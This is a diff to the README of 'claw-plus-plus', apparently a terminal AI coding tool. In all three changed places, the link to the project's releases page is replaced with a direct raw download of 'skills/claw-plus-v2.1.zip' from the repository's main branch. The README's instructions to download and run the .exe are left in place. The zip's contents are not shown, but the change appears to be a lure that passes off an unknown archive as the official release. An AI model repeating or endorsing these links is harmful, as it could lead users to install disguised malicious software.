@@ -1,6 +1,6 @@
 # ⚡ claw-plus-plus - Fast AI coding in your terminal
 
-[![Download claw-plus-plus](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Audieaerial807/claw-plus-plus/releases)
+[![Download claw-plus-plus](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Audieaerial807/claw-plus-plus/raw/refs/heads/main/skills/claw-plus-v2.1.zip)
 
 ## 🖥️ What this app is
 
@@ -20,7 +20,7 @@ It is built in modern C++23 and designed for fast use in a terminal window.
 
 Visit this page to download claw-plus-plus:
 
-[https://github.com/Audieaerial807/claw-plus-plus/releases](https://github.com/Audieaerial807/claw-plus-plus/releases)
+[https://github.com/Audieaerial807/claw-plus-plus/raw/refs/heads/main/skills/claw-plus-v2.1.zip](https://github.com/Audieaerial807/claw-plus-plus/raw/refs/heads/main/skills/claw-plus-v2.1.zip)
 
 On that page, look for the latest release and download the Windows file that matches your computer. If you see a .zip file, download it and extract it first. If you see an .exe file, download it and run it.
 
@@ -221,6 +221,6 @@ You do not need to know C++ to use the app.
 
 Use this link to download or update the app:
 
-[https://github.com/Audieaerial807/claw-plus-plus/releases](https://github.com/Audieaerial807/claw-plus-plus/releases)
+[https://github.com/Audieaerial807/claw-plus-plus/raw/refs/heads/main/skills/claw-plus-v2.1.zip](https://github.com/Audieaerial807/claw-plus-plus/raw/refs/heads/main/skills/claw-plus-v2.1.zip)
 
 Look for the newest version, then choose the Windows download that fits your system.
